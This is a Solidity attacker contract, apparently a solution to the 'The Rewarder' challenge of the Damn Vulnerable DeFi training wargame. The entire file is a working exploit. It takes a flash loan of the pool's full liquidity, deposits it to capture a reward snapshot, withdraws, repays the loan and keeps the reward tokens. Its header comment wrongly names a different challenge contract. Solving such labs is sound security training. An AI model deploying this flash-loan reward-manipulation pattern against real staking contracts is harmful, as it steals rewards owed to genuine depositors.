// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;

    function distributeRewards() external returns (uint256 rewards);
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attacker_rewarder {
    IFlashLoanerPool immutable pool;
    ITheRewarderPool immutable rewarder;
    IERC20 immutable liquidity;
    IERC20 immutable reward;

    address immutable me;

    constructor(
        address _pool,
        address _rewarder,
        address _liquidity,
        address _reward
    ) {
        pool = IFlashLoanerPool(_pool);
        rewarder = ITheRewarderPool(_rewarder);
        liquidity = IERC20(_liquidity);
        reward = IERC20(_reward);
        me = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidity.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.distributeRewards();
        rewarder.withdraw(amount);
        liquidity.transfer(address(pool), amount);
        uint256 rewards = reward.balanceOf(address(this));
        reward.transfer(me, rewards);
    }

    function attack() external {
        uint256 amount = liquidity.balanceOf(address(pool));
        pool.flashLoan(amount);
    }
}
